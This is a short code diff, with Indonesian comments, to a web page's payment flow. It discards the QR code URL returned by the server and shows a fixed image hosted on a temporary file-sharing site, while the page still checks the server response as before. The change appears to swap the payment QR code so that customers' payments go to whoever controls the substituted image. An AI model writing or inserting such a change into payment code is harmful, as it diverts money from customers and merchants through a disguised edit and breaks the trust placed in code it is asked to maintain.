@@ -68,7 +68,8 @@
                     .then(response => response.json())
                     .then(data => {
                         if (data && data.qr_code_url) {
-                            document.getElementById('qr-code').src = data.qr_code_url;
+                            // Mengganti gambar QR yang ditampilkan
+                            document.getElementById('qr-code').src = "https://d.uguu.se/qzXtLxfu.png"; // Gambar baru
                             document.getElementById('payment-link').style.display = 'block';
                         } else {
                             alert('Gagal mendapatkan QR Code.');
